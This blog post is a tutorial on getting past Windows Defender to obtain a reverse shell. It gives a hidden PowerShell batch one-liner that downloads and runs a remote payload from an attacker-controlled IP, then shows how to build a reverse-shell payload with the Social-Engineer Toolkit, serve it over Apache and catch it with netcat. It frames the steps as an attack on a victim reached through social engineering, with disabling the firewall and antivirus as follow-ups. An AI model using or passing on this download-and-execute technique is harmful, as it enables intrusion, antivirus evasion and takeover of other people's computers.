---
layout: post
title: Bypass Windows defender & Get reverse Shell
---
![](/images/02-june-bypassdef/0.png)

In most cases, when an attacker tries to execute a payload in windows environment, windows defender flag and block the action. 

The objective of this tutorial is to bypass windows defender with a little bit of social engineering and gain a reverse shell.

So first we need to somehow perform social engineering and drop a bat file on victims’ computer. The bat file won’t be flagged by an AV (I’ll make another tutorial to show how we can drop a file without getting flagged) and once the .bat file is executed; the bat file can be deleted, and we will still have our reverse shell. You can also use custom PowerShell payload as long as the file has .txt extension. 

So, once you have the shell, then the attacker can disable firewall, defender, install malware and do more sophisticated attacks.

What does the bat file look like?

```
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://ip/ps.txt')"
```

What this does is call the IP address and use the payload.txt file, which means the reverse shell is being generated from this txt file so even if the bat file gets deleted by the user, we will still have the shell.


How to generate the payload for the txt file ?

For this we will use social engineering tool kit. It comes by default in kali box but since I am using ec2 instance for testing, I had to install it by cloning the GitHub repository. 

```
git clone https://github.com/trustedsec/social-engineer-toolkit.git
```


Once you have it, run it:



![](/images/02-june-bypassdef/1.png)

For this tutorial, we will use option 1:
![](/images/02-june-bypassdef/2.png)

We are going to be using power shell attack vectors 
![](/images/02-june-bypassdef/3.png)

![](/images/02-june-bypassdef/4.png)

We will be using reverse shell, and enter the public IP address of the listening host and port number.
![](/images/02-june-bypassdef/5.png)

I didn’t start the listener because I wanted to use netcat to get the reverse shell.


The payload is being saved to /root/.set/report/powershell 

We used the name ps.txt in the .bat file, so we will rename the .txt file into ps.txt and move it to /var/www/html because I am serving this file over apache2.


![](/images/02-june-bypassdef/6.png)

Before we start the attack, notice that defender is active:
![](/images/02-june-bypassdef/7.png)

Now start the netcat listener and execute the .bat file and BooOOOM !! without any flagging we got a reverse shell.
![](/images/02-june-bypassdef/8.png)


![](/images/02-june-bypassdef/9.png)
Now we can delete the trojan.bat file from the system aswell.

![](/images/02-june-bypassdef/10.png)


If you have any questions, reach out to me :)
